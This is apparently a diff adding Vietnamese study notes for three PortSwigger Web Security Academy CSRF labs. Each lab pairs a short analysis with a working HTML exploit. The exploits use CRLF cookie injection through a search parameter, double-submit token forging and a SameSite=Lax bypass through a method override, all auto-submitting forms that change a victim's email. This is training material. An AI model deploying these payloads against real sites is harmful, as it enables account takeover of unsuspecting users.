@@ -1,0 +1,55 @@
+5: 
+
+Phân tích 1: Khi search ta thấy web có set thông tin search cũ vào 1 cookie, và nó có thể inject để thay đổi Cookie bằng Set-Cookie
+
+Phân tích 2: khi đăng nhập, ta thấy rằng nếu Cookie csrfKey không bị phụ thuộc vào session Cookie và nếu đổi một cặp csrfKey (Cookie) và csrf(payload) thì request change mail vẫn hoạt động được
+
+Ta sẽ tạo một form có sẵn email và csrf cũ và tạo một HTML element để Set-Cookie csrfKey để có thể thay đổi được email của victim. HTML trong exploit sever:
+
+<html>
+    <body>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a8a004504139b72c42eeba00009006d.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="test5@test.ca">
+            <input type="hidden" name="csrf" value="9ITWXSyqMLSLW5GTu1OScxsTYdJuZuQE"> -----ĐÂY LÀ CSRF CÓ SẴN-----
+        </form>
+
+        <img style="display:none;" src="https://0a8a004504139b72c42eeba00009006d.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=rEwCXdM57gVIDM324u1B6tAtPK8KRUbk"------ĐÂY LÀ CSRFKEY CÓ ẴN -----onerror="document.forms[0].submit()">
+    </body>
+</html>
+
+Bấm deliver view to view để thay đổi email của victim
+
+6:
+(Ở bài này ta cũng có thể inject search để có thể Set-Cookie)
+Phân tích 1: Khi đăng nhập tài khoản wiener và đổi email ta thấy csrf ở cookie và payload là giống nhau. Hơn nữa, khi đổi 2 giá trị này sang một giá trị khác thì vẫn có thể thay đổi email
+
+Ta sẽ tạo form có sẵn chứa email và csrf cùng với url để Set-Cookie có chính là csrf gửi ở trong payload, đưa nó vào body trong exploit sever và bấm delivery to victim. Body:
+
+<html>
+    <body>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a12001504eb60a8c17c7b86004b00ac.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="test5@test.ca">
+            <input type="hidden" name="csrf" value="aaaa">
+        </form>
+        <img src="https://0a12001504eb60a8c17c7b86004b00ac.web-security-academy.net/?search=asdf%0d%0aSet-Cookie:%20csrf=aaaa%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+    </body>
+</html>
+
+
+7:  Vì SameSite:Lax yêu cầu req phải là GET nên ta chuyển method thành GET và để POST vào payload
+
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+ <form action="https://0a1f002703276800c0df271100bc00ae.web-security-academy.net/my-account/change-email" method="GET">
+  <input type="hidden" name="_method" value="POST">
+  <input type="hidden" name="email" value="asda@asdsad">
+ </form>
+<script>
+ document.forms[0].submit();
+</script>
+</body>
+</html>
